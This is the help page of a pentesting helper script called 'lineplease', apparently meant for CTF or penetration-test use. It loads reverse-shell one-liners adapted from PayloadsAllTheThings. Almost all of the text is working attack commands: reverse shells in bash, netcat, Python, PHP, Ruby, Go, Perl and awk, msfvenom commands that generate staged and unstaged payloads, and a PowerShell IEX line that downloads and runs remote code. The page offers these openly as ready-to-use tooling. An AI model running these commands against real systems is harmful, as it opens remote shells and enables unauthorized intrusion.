                      __   _____  ______
                     / /  /  _/ |/ / __/
                    / /___/ //    / _/  
         ___  __   /____/___/_/|_/___/  
        / _ \/ /  / __/ _ | / __/ __/   
       / ___/ /__/ _// __ |_\ \/ _/     
      /_/  /____/___/_/ |_/___/___/     

"You thought your secrets were safe...you..ehmm...line please!!"

helper script to load up reverse shell oneliners

author: rub3rth

oneliners from PayLoadAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings


for reverse shell line:
usage: 		./lineplease [options] [interface] [port]
example: 	./lineplease -b eth0 1337

ipv4-address on desired interface is inserted into line 
for public ip specify interface as 'pub'

when prompted:  y to copy line to clipboard or any other key to continue (requires xsel)
		y to start netcat listener or any other key to exit

for msfvenom (requires msfvenom):
usage: 		./lineplease [options] [interface] [port] [name]
example: 	./lineplease -m2 tun0 1337 rev

when prompted: 	y to create file or any other key to exit

-h 		display this page
example:	./lineplease -h

OPTIONS		-----------------------------------

BASH
-b      	bash -i >& /dev/tcp/[ip]/[port] 0>&1
-be		0<&196;exec 196<>/dev/tcp/[ip]/[port]; sh <&196 >&196 2>&196
-bc     	bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'

NETCAT
-n      	nc -e /bin/bash [ip] [port]
-ns		nc -e /bin/sh [ip] [port]
-nc		nc -c bash [ip] [port]

PYTHON
-py1		export RHOST="[ip]";export RPORT=[port];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));		      [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

-py2		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",[port]));os.dup2(s.fileno(),0); 			os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

PHP
-p1		php -r '$sock=fsockopen("[ip]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'
-p2		php -r '$sock=fsockopen("[ip]",[port]);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
-p3		php -r '$sock=fsockopen("[ip]",[port]);`/bin/sh -i <&3 >&3 2>&3`;'
-p4		php -r '$sock=fsockopen("[ip]",[port]);system("/bin/sh -i <&3 >&3 2>&3");'
-p5		php -r '$sock=fsockopen("[ip]",[port]);passthru("/bin/sh -i <&3 >&3 2>&3");'
-p6		php -r '$sock=fsockopen("[ip]",[port]);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
-p7		php -r '$sock=fsockopen("[ip]",[port]);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

RUBY
-r		ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[ip]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-rw		ruby -rsocket -e 'c=TCPSocket.new("[ip]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'	(windows only)


GOLANG
-g		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","[ip]:[port]");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c 		    cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

PERL
-pe		perl -e 'use Socket;$i="[ip]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) 			{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-pe2		perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[ip]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'			
-pw		perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[ip]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'	(windows only)

AWK
-a		awk 'BEGIN {s = "/inet/tcp/0/[ip]/[port]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; 		  close(c); } } while(c != "exit") close(s); }}' /dev/null

POWERSHELL
-ps1            too long and messy to print out here
-ps2            same goes for this one

MSFVENOM UNSTAGED
-m1 		msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f exe > [name].exe
-m2		msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf > [name].elf
-m3     	msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f macho > [name].macho
-m4		msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].jsp
-m5		msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f war > [name].war
-m6		msfvenom -p cmd/unix/reverse_python LHOST=[ip] LPORT=[port] -f raw > [name].py
-m7		msfvenom -p cmd/unix/reverse_bash LHOST=[ip] LPORT=[port] -f raw > [name].sh
-m8		msfvenom -p cmd/unix/reverse_perl LHOST=[ip] LPORT=[port] -f raw > [name].pl

MSFVENOM STAGED
-m1s    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe > [name].exe
-m2s    	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf > [name].elf
-mas    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f asp > [name].asp
-mps		msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].php; cat [name].php | xsel --clipboard --input && echo '<?php ' | tr 		     -d '\n' > [name].php && xsel --clipboard --output >> [name].php
                (requires xsel)

LAZY OPTIONS
-pu2		python -c 'import pty; pty.spawn("/bin/bash")'
-pu3 		python3 -c 'import pty; pty.spawn("/bin/bash")'

		loads up line for python shell upgrade

		usage:		./lineplease.sh -pu2

-psd		powershell "IEX(New-Object Net.WebClient).downloadString('http://[ip]:[port]/[filename]')"

		loads up a powershell command to download the file linpeas.sh from ip address of eth0

		usage:		./lineplease.sh -psd [interface] [port] [filename]
		example:	./lineplease.sh -psd eth0 1337 linpeas.sh
		when prompted:	y to copy to clipboard/any other key to continue
		when prompted:	y to start web server in current directory/any other key to exit

